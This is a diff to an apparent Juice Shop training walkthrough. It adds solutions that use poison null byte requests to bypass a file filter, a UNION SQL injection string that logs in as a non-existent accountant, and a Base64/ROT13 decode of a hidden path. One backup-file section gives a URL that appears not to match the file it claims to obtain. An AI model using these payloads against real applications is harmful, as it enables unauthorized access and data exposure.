@@ -14,7 +14,76 @@ POST /api/BasketItems/
 {"ProductId":10,"BasketId":"1","quantity":1}
 ```
 
-Finally, finish the order in your browser. 
+Finally, finish the order in your browser.
+
+## Easter Egg (Broken Access Control)
+_Find the hidden easter egg._
+
+The egg is at `/ftp/eastere.gg`. However, it's protected by a file extension filter:
+```
+403 Error: Only .md and .pdf files are allowed!
+```
+
+The trick is exploiting [CWE-626: Null Byte Interaction Error (Poison Null Byte)](https://cwe.mitre.org/data/definitions/626.html)
+> The poison null byte is frequently useful in path traversal attacks by terminating hard-coded extensions that are added to a filename.
+
+Call `GET /ftp/eastere.gg%2500.md` (`%25` is URL encoded `%`):
+```
+"Congratulations, you found the easter egg!"
+- The incredibly funny developers
+
+...
+
+...
+
+...
+
+Oh' wait, this isn't an easter egg at all! It's just a boring text file! The real easter egg can be found here:
+
+L2d1ci9xcmlmL25lci9mYi9zaGFhbC9ndXJsL3V2cS9uYS9ybmZncmUvcnR0L2p2Z3V2YS9ndXIvcm5mZ3JlL3J0dA==
+
+Good luck, egg hunter!
+```
+
+## Ephemeral Accountant (Injection)
+_Log in with the (non-existing) accountant acc0unt4nt@juice-sh.op without ever registering that user._
+
+This is about SQL injection into _Login form_. If you already done the [Database Schema](level3.md#database-schema-injection)
+challenge, you know the number of columns and data types of `users` table.
+ 
+```
+xxx' UNION SELECT 999, '', 'acc0unt4nt@juice-sh.op', 'password', 'accounting', '', '0.0.0.0', '/assets/public/images/uploads/default.svg', '', 1, '2020-08-15T18:22:49.161Z', '2020-08-15T18:22:49.161Z', null; --
+```
+
+The role must be the `accounting`!
+
+## Forgotten Developer Backup (Sensitive Data Exposure)
+_Access a developer's forgotten backup file._
+
+The same trick as in the [Easter Egg](#easter-egg-broken-access-control) challenge.
+
+Call `GET /ftp/coupons_2013.md.bak%2500.md` and obtain [package.json.bak](misc/package.json.bak).
+
+## Forgotten Sales Backup (Sensitive Data Exposure)
+_Access a salesman's forgotten backup file._
+
+The same trick as in the [Easter Egg](#easter-egg-broken-access-control) challenge.
+
+Call `GET /ftp/coupons_2013.md.bak%2500.md`
+```
+n<MibgC7sn
+mNYS#gC7sn
+o*IVigC7sn
+k#pDlgC7sn
+o*I]pgC7sn
+n(XRvgC7sn
+n(XLtgC7sn
+k#*AfgC7sn
+q:<IqgC7sn
+pEw8ogC7sn
+pes[BgC7sn
+l}6D$gC7ss
+```
 
 ## Leaked Unsafe Product (Sensitive Data Exposure)
 _Identify an unsafe product that was removed from the shop and inform the shop which ingredients are dangerous._
@@ -40,17 +109,27 @@ or get the answer from `keywordsForPastebinDataLeakChallenge` (guess this is not
 
 Submit `Hueteroneel and Eurogium Edule` into _Customer Feedback_ form.
 
-## Ephemeral Accountant (Injection)
-_Log in with the (non-existing) accountant acc0unt4nt@juice-sh.op without ever registering that user._
+## Nested Easter Egg (Cryptographic Issues)
+_Apply some advanced cryptanalysis to find the real easter egg._
 
-This is about SQL injection into _Login form_. If you already done the [Database Schema](level3.md#database-schema-injection)
-challenge, you know the number of columns and data types of `users` table.
+This challenge follows [Easter Egg](#easter-egg-broken-access-control). The goal is to decrypt:
+```
+L2d1ci9xcmlmL25lci9mYi9zaGFhbC9ndXJsL3V2cS9uYS9ybmZncmUvcnR0L2p2Z3V2YS9ndXIvcm5mZ3JlL3J0dA==
+```
+
+This is rather easy.
  
+1) Decode `Base64` (https://www.base64decode.org/):
 ```
-xxx' UNION SELECT 999, '', 'acc0unt4nt@juice-sh.op', 'password', 'accounting', '', '0.0.0.0', '/assets/public/images/uploads/default.svg', '', 1, '2020-08-15T18:22:49.161Z', '2020-08-15T18:22:49.161Z', null; --
+/gur/qrif/ner/fb/shaal/gurl/uvq/na/rnfgre/rtt/jvguva/gur/rnfgre/rtt
 ```
 
-The role must be the `accounting`!
+2) Apply [ROT13](https://en.wikipedia.org/wiki/ROT13) cipher (https://rot13.com/):
+```
+/the/devs/are/so/funny/they/hid/an/easter/egg/within/the/easter/egg
+```
+
+Call `GET /the/devs/are/so/funny/they/hid/an/easter/egg/within/the/easter/egg`
 
 ## Reset Bender's Password (Broken Authentication)
 _Reset Bender's password via the Forgot Password mechanism with the original answer to his security question._
